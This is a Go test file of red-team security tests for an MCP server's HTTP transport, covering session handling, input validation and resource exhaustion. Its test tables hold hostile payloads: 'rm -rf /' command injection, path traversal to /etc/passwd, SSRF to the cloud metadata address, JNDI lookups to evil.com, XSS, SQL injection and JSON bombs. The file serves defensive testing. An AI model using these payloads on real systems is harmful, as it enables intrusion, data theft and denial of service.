package mcp

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
)

// =============================================================================
// RED TEAM SECURITY TESTS — MCP Transport Layer
// =============================================================================
//
// Task #3: Authentication and Authorization (session manipulation, token abuse)
// Task #4: Input Validation and Injection (malformed JSON, bombs, payloads)
// Task #5: Resource Exhaustion and Denial-of-Service (concurrency, body size)
// =============================================================================

// --- Helper: minimal handler for security tests ---

type secMockHandler struct {
	handleFn func(ctx context.Context, method string, params json.RawMessage) (interface{}, *JSONRPCError)
}

func (m *secMockHandler) HandleMethod(ctx context.Context, method string, params json.RawMessage) (interface{}, *JSONRPCError) {
	if m.handleFn != nil {
		return m.handleFn(ctx, method, params)
	}
	return map[string]string{"ok": "true"}, nil
}

func (m *secMockHandler) ServerInfo() ServerInfo {
	return ServerInfo{Name: "sec-test", Version: "0.0.1"}
}

func (m *secMockHandler) Capabilities() ServerCapabilities {
	return ServerCapabilities{
		Tools: &ToolsCapability{ListChanged: false},
	}
}

func secPost(t *testing.T, transport *Transport, body string, headers ...http.Header) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	for _, h := range headers {
		for k, vals := range h {
			for _, v := range vals {
				req.Header.Add(k, v)
			}
		}
	}
	w := httptest.NewRecorder()
	transport.ServeHTTP(w, req)
	return w
}

func parseRPCResponse(t *testing.T, w *httptest.ResponseRecorder) *JSONRPCResponse {
	t.Helper()
	body, _ := io.ReadAll(w.Body)
	var resp JSONRPCResponse
	if err := json.Unmarshal(body, &resp); err != nil {
		t.Fatalf("failed to parse JSON-RPC response: %v\nbody: %s", err, string(body))
	}
	return &resp
}

// =============================================================================
// TASK #3: Authentication and Authorization Security Tests
// =============================================================================

func TestSecurity_Session_FakeSessionID(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	// Attempt to use a completely fabricated session ID
	body := `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`
	req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Mcp-Session-Id", "aaaaaabbbbbbccccccddddddeeeeeeeeffffffffgggggggg")
	w := httptest.NewRecorder()
	transport.ServeHTTP(w, req)

	// The transport should still process the request (session ID is not enforced for non-initialize)
	// This documents the current behavior. If session enforcement is added, this test should be updated.
	if w.Code != http.StatusOK {
		t.Logf("[INFO] Fake session ID rejected with status %d (good if session enforcement is on)", w.Code)
	}
}

func TestSecurity_Session_EmptySessionID(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	body := `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`
	req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Mcp-Session-Id", "")
	w := httptest.NewRecorder()
	transport.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("empty session ID should not crash, got status %d", w.Code)
	}
}

func TestSecurity_Session_NullBytesInSessionID(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	body := `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`
	req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Mcp-Session-Id", "abc\x00def\x00ghi")
	w := httptest.NewRecorder()
	transport.ServeHTTP(w, req)

	// Must not panic or produce server error
	if w.Code >= 500 {
		t.Errorf("null bytes in session ID caused server error: %d", w.Code)
	}
}

func TestSecurity_Session_SpecialCharsInSessionID(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	maliciousIDs := []string{
		"../../../etc/passwd",
		"<script>alert(1)</script>",
		"'; DROP TABLE sessions; --",
		strings.Repeat("A", 10000),
		"../../../../proc/self/environ",
		"{{.ID}}",
		"${jndi:ldap://evil.com/x}",
		"\r\nX-Injected-Header: pwned",
	}

	for _, sid := range maliciousIDs {
		t.Run("sid_"+sid[:min(20, len(sid))], func(t *testing.T) {
			body := `{"jsonrpc":"2.0","id":1,"method":"ping"}`
			req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Mcp-Session-Id", sid)
			w := httptest.NewRecorder()
			transport.ServeHTTP(w, req)

			if w.Code >= 500 {
				t.Errorf("malicious session ID caused server error: status=%d, sid=%q", w.Code, sid[:min(40, len(sid))])
			}
		})
	}
}

func TestSecurity_Session_DeleteOthersSessions(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	// Create a legitimate session
	session, err := sessions.NewSession(nil)
	if err != nil {
		t.Fatal(err)
	}

	// Attacker tries to delete it
	req := httptest.NewRequest(http.MethodDelete, "/mcp/v1", nil)
	req.Header.Set("Mcp-Session-Id", session.ID)
	w := httptest.NewRecorder()
	transport.ServeHTTP(w, req)

	// Document: currently any client can delete any session if they know the ID.
	// This is a finding if session deletion should be authenticated.
	_, exists := sessions.GetSession(session.ID)
	if !exists {
		t.Log("[FINDING] Session was deleted by unauthenticated request. If the MCP endpoint is behind auth middleware, this is mitigated.")
	}
}

func TestSecurity_Session_DeleteNonexistent(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	req := httptest.NewRequest(http.MethodDelete, "/mcp/v1", nil)
	req.Header.Set("Mcp-Session-Id", "nonexistent-session-id")
	w := httptest.NewRecorder()
	transport.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Errorf("deleting nonexistent session should return 204, got %d", w.Code)
	}
}

func TestSecurity_Session_InitializeWithMaliciousCapabilities(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	// Try to inject extra capabilities fields
	body := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{
		"protocolVersion":"2025-03-26",
		"capabilities":{"admin":true,"superuser":true,"roots":{"listChanged":true}},
		"clientInfo":{"name":"evil-client","version":"666"}
	}}`
	w := secPost(t, transport, body)

	resp := parseRPCResponse(t, w)
	if resp.Error != nil {
		t.Fatalf("initialize should not fail: %v", resp.Error.Message)
	}

	sessionID := w.Header().Get("Mcp-Session-Id")
	if sessionID == "" {
		t.Fatal("expected session ID")
	}

	// Verify the session doesn't have escalated capabilities
	session, ok := sessions.GetSession(sessionID)
	if !ok {
		t.Fatal("session should exist")
	}
	if session.ClientCapabilities == nil {
		t.Log("[OK] No client capabilities stored (safe)")
		return
	}
	// The struct only has Roots and Sampling — extra JSON fields are silently ignored.
	// This is the correct Go behavior (no arbitrary field injection).
	t.Log("[OK] Extra capability fields silently ignored (Go struct does not allow injection)")
}

func TestSecurity_Session_ReinitializeExistingSession(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	// Initialize first session
	body := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}`
	w1 := secPost(t, transport, body)
	sid1 := w1.Header().Get("Mcp-Session-Id")
	if sid1 == "" {
		t.Fatal("first session ID missing")
	}

	// Try reinitializing — should create a NEW session, not reuse
	w2 := secPost(t, transport, body)
	sid2 := w2.Header().Get("Mcp-Session-Id")
	if sid2 == "" {
		t.Fatal("second session ID missing")
	}

	if sid1 == sid2 {
		t.Error("[FINDING] Reinitialize reused the same session ID — session fixation risk")
	}
}

func TestSecurity_Session_MultipleSessionsRapidCreate(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	body := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"flood","version":"1.0"}}}`

	ids := make(map[string]bool)
	for i := 0; i < 100; i++ {
		w := secPost(t, transport, body)
		sid := w.Header().Get("Mcp-Session-Id")
		if sid == "" {
			t.Fatalf("session creation failed at iteration %d", i)
		}
		if ids[sid] {
			t.Fatalf("duplicate session ID at iteration %d: %s", i, sid)
		}
		ids[sid] = true
	}

	t.Logf("[INFO] 100 sessions created without rate limiting. Session store has no cleanup/TTL — potential memory leak vector.")
}

// =============================================================================
// TASK #4: Input Validation and Injection Security Tests
// =============================================================================

func TestSecurity_MalformedJSON_Variants(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	malformed := []struct {
		name string
		body string
	}{
		{"missing_closing_brace", `{"jsonrpc":"2.0","id":1,"method":"ping"`},
		{"trailing_comma", `{"jsonrpc":"2.0","id":1,"method":"ping",}`},
		{"single_quotes", `{'jsonrpc':'2.0','id':1,'method':'ping'}`},
		{"unquoted_key", `{jsonrpc:"2.0",id:1,method:"ping"}`},
		{"null_byte_in_method", `{"jsonrpc":"2.0","id":1,"method":"pi\u0000ng"}`},
		{"unicode_escape_attack", `{"jsonrpc":"2.0","id":1,"method":"\u0070\u0069\u006e\u0067"}`},
		{"duplicate_keys", `{"jsonrpc":"2.0","jsonrpc":"1.0","id":1,"method":"ping"}`},
		{"integer_as_string_id", `{"jsonrpc":"2.0","id":"1","method":"ping"}`},
		{"float_id", `{"jsonrpc":"2.0","id":1.5,"method":"ping"}`},
		{"negative_id", `{"jsonrpc":"2.0","id":-1,"method":"ping"}`},
		{"null_id", `{"jsonrpc":"2.0","id":null,"method":"ping"}`},
		{"boolean_id", `{"jsonrpc":"2.0","id":true,"method":"ping"}`},
		{"array_id", `{"jsonrpc":"2.0","id":[1,2],"method":"ping"}`},
		{"object_id", `{"jsonrpc":"2.0","id":{"a":1},"method":"ping"}`},
	}

	for _, tc := range malformed {
		t.Run(tc.name, func(t *testing.T) {
			w := secPost(t, transport, tc.body)
			if w.Code >= 500 {
				t.Errorf("[CRITICAL] Malformed JSON caused server error: status=%d", w.Code)
			}
		})
	}
}

func TestSecurity_JSONBomb_DeepNesting(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	// Build deeply nested JSON: {"a":{"a":{"a":...}}}
	depth := 1000
	var b strings.Builder
	b.WriteString(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test","arguments":`)
	for i := 0; i < depth; i++ {
		b.WriteString(`{"a":`)
	}
	b.WriteString(`"leaf"`)
	for i := 0; i < depth; i++ {
		b.WriteString(`}`)
	}
	b.WriteString(`}}`)

	w := secPost(t, transport, b.String())
	if w.Code >= 500 {
		t.Errorf("[FINDING] Deep nesting caused server error: status=%d", w.Code)
	}
}

func TestSecurity_JSONBomb_WideObject(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	// Object with 10,000 keys
	var b strings.Builder
	b.WriteString(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test","arguments":{`)
	for i := 0; i < 10000; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`"key_`)
		b.WriteString(strings.Repeat("x", 5))
		b.WriteString(`":`)
		b.WriteString(`"val"`)
	}
	b.WriteString(`}}}`)

	body := b.String()
	if len(body) > maxBodySize {
		// Will be rejected by body size limit, which is correct
		t.Log("[OK] Wide object exceeds body size limit")
		return
	}

	w := secPost(t, transport, body)
	if w.Code >= 500 {
		t.Errorf("[FINDING] Wide object caused server error: status=%d", w.Code)
	}
}

func TestSecurity_JSONBomb_LargeStringValue(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	// String value just under the 1MB limit
	bigValue := strings.Repeat("A", maxBodySize-100)
	body := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test","arguments":{"data":"` + bigValue + `"}}}`

	w := secPost(t, transport, body)
	// Should be rejected by body size limit
	if w.Code == http.StatusRequestEntityTooLarge {
		t.Log("[OK] Large string rejected by body size limit")
	} else if w.Code >= 500 {
		t.Errorf("[FINDING] Large string caused server error: status=%d", w.Code)
	}
}

func TestSecurity_MethodInjection(t *testing.T) {
	handler := &secMockHandler{
		handleFn: func(_ context.Context, method string, _ json.RawMessage) (interface{}, *JSONRPCError) {
			// Log what method was dispatched
			return map[string]string{"dispatched": method}, nil
		},
	}
	transport := NewTransport(handler)

	injections := []struct {
		name   string
		method string
	}{
		{"path_traversal", "../../../etc/passwd"},
		{"shell_injection", "tools/call; rm -rf /"},
		{"null_byte", "tools\x00/list"},
		{"unicode_override", "tools\u202e/tsil"},
		{"url_encoded", "tools%2flist"},
		{"double_encoded", "tools%252flist"},
		{"crlf_injection", "tools/list\r\nX-Header: injected"},
		{"very_long_method", strings.Repeat("a", 65536)},
		{"empty_method", ""},
		{"space_method", "   "},
		{"newline_method", "tools\n/list"},
	}

	for _, tc := range injections {
		t.Run(tc.name, func(t *testing.T) {
			body := `{"jsonrpc":"2.0","id":1,"method":"` + tc.method + `"}`
			w := secPost(t, transport, body)
			if w.Code >= 500 {
				t.Errorf("[FINDING] Method injection caused server error: method=%q, status=%d", tc.method, w.Code)
			}
		})
	}
}

func TestSecurity_ParamsInjection_ToolsCall(t *testing.T) {
	handler := &secMockHandler{
		handleFn: func(_ context.Context, method string, params json.RawMessage) (interface{}, *JSONRPCError) {
			if method == "tools/call" {
				var p ToolCallParams
				if err := json.Unmarshal(params, &p); err != nil {
					return nil, NewInvalidParams("bad params: " + err.Error())
				}
				return map[string]string{"tool": p.Name}, nil
			}
			return nil, NewMethodNotFound("not found")
		},
	}
	transport := NewTransport(handler)

	payloads := []struct {
		name string
		body string
	}{
		{"sql_injection_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"' OR '1'='1","arguments":{}}}`},
		{"path_traversal_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"../../../etc/passwd","arguments":{}}}`},
		{"xss_in_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"<script>alert(1)</script>","arguments":{}}}`},
		{"null_bytes_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test\u0000evil","arguments":{}}}`},
		{"empty_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"","arguments":{}}}`},
		{"very_long_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"` + strings.Repeat("x", 10000) + `","arguments":{}}}`},
		{"numeric_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":12345,"arguments":{}}}`},
		{"null_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":null,"arguments":{}}}`},
		{"array_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":["a","b"],"arguments":{}}}`},
		{"object_name", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":{"evil":true},"arguments":{}}}`},
		{"missing_arguments", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test"}}`},
		{"null_arguments", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test","arguments":null}}`},
		{"string_arguments", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test","arguments":"evil"}}`},
		{"extra_fields", `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"test","arguments":{},"admin":true,"role":"superuser"}}`},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			w := secPost(t, transport, tc.body)
			if w.Code >= 500 {
				t.Errorf("[CRITICAL] Injection payload caused server error: status=%d", w.Code)
			}
		})
	}
}

func TestSecurity_ParamsInjection_ResourcesRead(t *testing.T) {
	handler := &secMockHandler{
		handleFn: func(_ context.Context, method string, params json.RawMessage) (interface{}, *JSONRPCError) {
			if method == "resources/read" {
				var p ReadResourceParams
				if err := json.Unmarshal(params, &p); err != nil {
					return nil, NewInvalidParams("bad params: " + err.Error())
				}
				return map[string]string{"uri": p.URI}, nil
			}
			return nil, NewMethodNotFound("not found")
		},
	}
	transport := NewTransport(handler)

	uris := []struct {
		name string
		body string
	}{
		{"file_scheme", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"file:///etc/passwd"}}`},
		{"ftp_scheme", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"ftp://evil.com/malware"}}`},
		{"javascript_scheme", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"javascript:alert(1)"}}`},
		{"data_scheme", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"data:text/html,<script>evil</script>"}}`},
		{"ssrf_localhost", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"http://127.0.0.1:8080/admin"}}`},
		{"ssrf_metadata", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"http://169.254.169.254/latest/meta-data/"}}`},
		{"path_traversal", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"agent://../../etc/passwd"}}`},
		{"empty_uri", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":""}}`},
		{"null_uri", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":null}}`},
		{"very_long_uri", `{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"agent://` + strings.Repeat("a", 65536) + `"}}`},
	}

	for _, tc := range uris {
		t.Run(tc.name, func(t *testing.T) {
			w := secPost(t, transport, tc.body)
			if w.Code >= 500 {
				t.Errorf("[CRITICAL] URI injection caused server error: status=%d", w.Code)
			}
		})
	}
}

func TestSecurity_ParamsInjection_PromptsGet(t *testing.T) {
	handler := &secMockHandler{
		handleFn: func(_ context.Context, method string, params json.RawMessage) (interface{}, *JSONRPCError) {
			if method == "prompts/get" {
				var p GetPromptParams
				if err := json.Unmarshal(params, &p); err != nil {
					return nil, NewInvalidParams("bad params: " + err.Error())
				}
				return map[string]string{"name": p.Name}, nil
			}
			return nil, NewMethodNotFound("not found")
		},
	}
	transport := NewTransport(handler)

	payloads := []struct {
		name string
		body string
	}{
		{"template_injection", `{"jsonrpc":"2.0","id":1,"method":"prompts/get","params":{"name":"{{.Env}}"}}`},
		{"sql_in_args", `{"jsonrpc":"2.0","id":1,"method":"prompts/get","params":{"name":"test","arguments":{"topic":"'; DROP TABLE agents; --"}}}`},
		{"xss_in_args", `{"jsonrpc":"2.0","id":1,"method":"prompts/get","params":{"name":"test","arguments":{"topic":"<script>alert(document.cookie)</script>"}}}`},
		{"jndi_injection", `{"jsonrpc":"2.0","id":1,"method":"prompts/get","params":{"name":"${jndi:ldap://evil.com/x}"}}`},
		{"oversized_args", `{"jsonrpc":"2.0","id":1,"method":"prompts/get","params":{"name":"test","arguments":{"key":"` + strings.Repeat("V", 100000) + `"}}}`},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			w := secPost(t, transport, tc.body)
			if w.Code >= 500 {
				t.Errorf("[CRITICAL] Prompt injection caused server error: status=%d", w.Code)
			}
		})
	}
}

func TestSecurity_ProtocolVersionManipulation(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	versions := []string{
		"",
		"1.0",
		"999.999.999",
		"2025-03-26'; DROP TABLE sessions; --",
		strings.Repeat("2025-03-26", 1000),
		"<script>alert(1)</script>",
	}

	for _, v := range versions {
		t.Run("version_"+v[:min(20, len(v))], func(t *testing.T) {
			body := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"` + v + `","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}`
			w := secPost(t, transport, body)
			if w.Code >= 500 {
				t.Errorf("[FINDING] Protocol version manipulation caused server error: status=%d", w.Code)
			}
		})
	}
}

func TestSecurity_ContentTypeVariations(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	body := `{"jsonrpc":"2.0","id":1,"method":"ping"}`

	contentTypes := []struct {
		name     string
		ct       string
		wantCode int
	}{
		{"exact", "application/json", http.StatusOK},
		{"with_charset", "application/json; charset=utf-8", http.StatusOK},
		{"text_plain", "text/plain", http.StatusUnsupportedMediaType},
		{"text_html", "text/html", http.StatusUnsupportedMediaType},
		{"multipart", "multipart/form-data", http.StatusUnsupportedMediaType},
		{"xml", "application/xml", http.StatusUnsupportedMediaType},
		{"empty", "", http.StatusUnsupportedMediaType},
		{"injection", "application/json\r\nX-Evil: pwned", http.StatusOK}, // Go sanitizes headers
	}

	for _, tc := range contentTypes {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
			req.Header.Set("Content-Type", tc.ct)
			w := httptest.NewRecorder()
			transport.ServeHTTP(w, req)

			if w.Code >= 500 {
				t.Errorf("[CRITICAL] Content-Type %q caused server error: status=%d", tc.ct, w.Code)
			}
		})
	}
}

func TestSecurity_EmptyBody(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	bodies := []struct {
		name string
		body string
	}{
		{"empty", ""},
		{"whitespace", "   "},
		{"newlines", "\n\n\n"},
		{"tabs", "\t\t\t"},
		{"null", "null"},
		{"true", "true"},
		{"false", "false"},
		{"number", "42"},
		{"string", `"hello"`},
	}

	for _, tc := range bodies {
		t.Run(tc.name, func(t *testing.T) {
			w := secPost(t, transport, tc.body)
			if w.Code >= 500 {
				t.Errorf("[CRITICAL] Body %q caused server error: status=%d", tc.name, w.Code)
			}
		})
	}
}

func TestSecurity_BatchInjection(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	batches := []struct {
		name string
		body string
	}{
		{"nested_array", `[[{"jsonrpc":"2.0","id":1,"method":"ping"}]]`},
		{"mixed_types", `[{"jsonrpc":"2.0","id":1,"method":"ping"}, null, true, 42, "string"]`},
		{"huge_batch", `[` + strings.Repeat(`{"jsonrpc":"2.0","id":1,"method":"ping"},`, 999) + `{"jsonrpc":"2.0","id":1000,"method":"ping"}]`},
		{"duplicate_ids", `[{"jsonrpc":"2.0","id":1,"method":"ping"},{"jsonrpc":"2.0","id":1,"method":"tools/list"}]`},
	}

	for _, tc := range batches {
		t.Run(tc.name, func(t *testing.T) {
			if len(tc.body) > maxBodySize {
				t.Skip("body exceeds size limit, will be rejected correctly")
			}
			w := secPost(t, transport, tc.body)
			if w.Code >= 500 {
				t.Errorf("[FINDING] Batch injection caused server error: status=%d", w.Code)
			}
		})
	}
}

func TestSecurity_JSONRPCVersionBypass(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	versions := []string{
		"1.0",
		"2.1",
		"3.0",
		"",
		" 2.0 ",
		"2.0\x00",
		"2.0\n",
	}

	for _, v := range versions {
		t.Run("jsonrpc_"+v, func(t *testing.T) {
			body := `{"jsonrpc":"` + v + `","id":1,"method":"ping"}`
			w := secPost(t, transport, body)
			resp := parseRPCResponse(t, w)

			if resp.Error == nil && v != "2.0" {
				t.Errorf("[FINDING] Non-2.0 JSONRPC version %q accepted without error", v)
			}
		})
	}
}

// =============================================================================
// TASK #5: Resource Exhaustion and Denial-of-Service Security Tests
// =============================================================================

func TestSecurity_ConcurrentRequestBurst(t *testing.T) {
	var callCount int64
	handler := &secMockHandler{
		handleFn: func(_ context.Context, _ string, _ json.RawMessage) (interface{}, *JSONRPCError) {
			atomic.AddInt64(&callCount, 1)
			return map[string]string{"ok": "true"}, nil
		},
	}
	transport := NewTransport(handler)

	var wg sync.WaitGroup
	concurrency := 100
	var errors int64

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			body := `{"jsonrpc":"2.0","id":1,"method":"ping"}`
			req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			transport.ServeHTTP(w, req)
			if w.Code >= 500 {
				atomic.AddInt64(&errors, 1)
			}
		}()
	}

	wg.Wait()

	if errors > 0 {
		t.Errorf("[FINDING] %d/%d concurrent requests caused server errors", errors, concurrency)
	}
	t.Logf("[INFO] %d requests processed, %d handler calls", concurrency, callCount)
}

func TestSecurity_ConcurrentBatchBurst(t *testing.T) {
	var callCount int64
	handler := &secMockHandler{
		handleFn: func(_ context.Context, _ string, _ json.RawMessage) (interface{}, *JSONRPCError) {
			atomic.AddInt64(&callCount, 1)
			return map[string]string{"ok": "true"}, nil
		},
	}
	transport := NewTransport(handler)

	// Each request is a batch of 50 requests = 50 concurrent * 50 batch = 2500 total
	var wg sync.WaitGroup
	concurrency := 50
	batchSize := 50
	var errors int64

	var batchBody strings.Builder
	batchBody.WriteString("[")
	for i := 0; i < batchSize; i++ {
		if i > 0 {
			batchBody.WriteString(",")
		}
		batchBody.WriteString(`{"jsonrpc":"2.0","id":`)
		batchBody.WriteString(strings.Repeat("1", 1)) // reuse id 1 for simplicity
		batchBody.WriteString(`,"method":"ping"}`)
	}
	batchBody.WriteString("]")
	body := batchBody.String()

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			req := httptest.NewRequest(http.MethodPost, "/mcp/v1", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			transport.ServeHTTP(w, req)
			if w.Code >= 500 {
				atomic.AddInt64(&errors, 1)
			}
		}()
	}

	wg.Wait()

	if errors > 0 {
		t.Errorf("[FINDING] %d/%d concurrent batch requests caused server errors", errors, concurrency)
	}
	t.Logf("[INFO] %d total handler calls from %d*%d batch requests", callCount, concurrency, batchSize)
}

func TestSecurity_BodySizeLimits(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	sizes := []struct {
		name     string
		size     int
		wantFail bool
	}{
		{"exactly_1MB", maxBodySize, false},
		{"1MB_plus_1", maxBodySize + 1, true},
		{"2MB", 2 * maxBodySize, true},
		{"10MB", 10 * maxBodySize, true},
	}

	for _, tc := range sizes {
		t.Run(tc.name, func(t *testing.T) {
			body := `{"jsonrpc":"2.0","id":1,"method":"ping","params":{"data":"` + strings.Repeat("x", tc.size) + `"}}`
			w := secPost(t, transport, body)

			if tc.wantFail {
				if w.Code == http.StatusOK {
					resp := parseRPCResponse(t, w)
					if resp.Error == nil {
						t.Errorf("[FINDING] Oversized body (%d bytes) was accepted", tc.size)
					}
				}
			}

			if w.Code >= 500 {
				t.Errorf("[FINDING] Body size %d caused server error: %d", tc.size, w.Code)
			}
		})
	}
}

func TestSecurity_ConcurrentSessionCreationAndDeletion(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	var wg sync.WaitGroup
	var errors int64
	sessionIDs := make([]string, 100)
	var mu sync.Mutex

	// Create 100 sessions concurrently
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			body := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"stress","version":"1.0"}}}`
			w := secPost(t, transport, body)
			if w.Code >= 500 {
				atomic.AddInt64(&errors, 1)
				return
			}
			sid := w.Header().Get("Mcp-Session-Id")
			mu.Lock()
			sessionIDs[idx] = sid
			mu.Unlock()
		}(i)
	}
	wg.Wait()

	if errors > 0 {
		t.Errorf("[FINDING] %d/100 concurrent session creates caused errors", errors)
	}

	// Delete them all concurrently
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			mu.Lock()
			sid := sessionIDs[idx]
			mu.Unlock()
			if sid == "" {
				return
			}
			req := httptest.NewRequest(http.MethodDelete, "/mcp/v1", nil)
			req.Header.Set("Mcp-Session-Id", sid)
			w := httptest.NewRecorder()
			transport.ServeHTTP(w, req)
			if w.Code >= 500 {
				atomic.AddInt64(&errors, 1)
			}
		}(i)
	}
	wg.Wait()

	if errors > 0 {
		t.Errorf("[FINDING] %d concurrent session deletes caused errors", errors)
	}
}

func TestSecurity_SlowlorisSimulation(t *testing.T) {
	handler := &secMockHandler{}
	transport := NewTransport(handler)

	// Simulate a request with a very small incomplete body
	// The transport uses io.ReadAll, so it blocks until reader is done.
	// With httptest, the body is already buffered, so we test partial JSON instead.
	partials := []string{
		`{`,
		`{"jsonrpc":`,
		`{"jsonrpc":"2.0","id":1`,
		`{"jsonrpc":"2.0","id":1,"method":`,
		`{"jsonrpc":"2.0","id":1,"method":"ping","params":{"ke`,
	}

	for _, partial := range partials {
		t.Run("partial_"+partial[:min(10, len(partial))], func(t *testing.T) {
			w := secPost(t, transport, partial)
			if w.Code >= 500 {
				t.Errorf("[FINDING] Partial body caused server error: status=%d", w.Code)
			}
		})
	}
}

func TestSecurity_RepeatedInitialize(t *testing.T) {
	handler := &secMockHandler{}
	sessions := NewSessionStore()
	transport := NewTransportWithSessions(handler, sessions)

	body := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"flood","version":"1.0"}}}`

	// Rapidly re-initialize 500 times
	for i := 0; i < 500; i++ {
		w := secPost(t, transport, body)
		if w.Code >= 500 {
			t.Fatalf("[FINDING] Initialize failed at iteration %d: status=%d", i, w.Code)
		}
	}

	// Check memory usage: 500 sessions in the store with no cleanup
	t.Logf("[INFO] 500 sessions created without cleanup — session store has no TTL/eviction. This is a potential memory exhaustion vector under sustained attack.")
}

func TestSecurity_MixedHTTPMethods(t *testing.T) {
	handler := &secMockHandler{}
